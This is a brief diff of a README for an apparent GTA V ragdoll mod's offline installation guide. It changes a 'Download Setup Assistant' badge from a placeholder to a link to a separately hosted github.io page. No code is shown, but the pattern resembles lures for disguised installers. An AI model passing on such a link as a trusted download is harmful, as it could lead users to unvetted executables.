@@ -1,6 +1,6 @@
 # Euphoria Ragdoll Overhaul — Offline Installation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://euphoria-ragdoll-overhaul-gta5-setup.github.io/.github)
 
 > **Why this repo?**  
 > Corporate firewall? On-site training lab? Gaming rig with no Wi-Fi?  
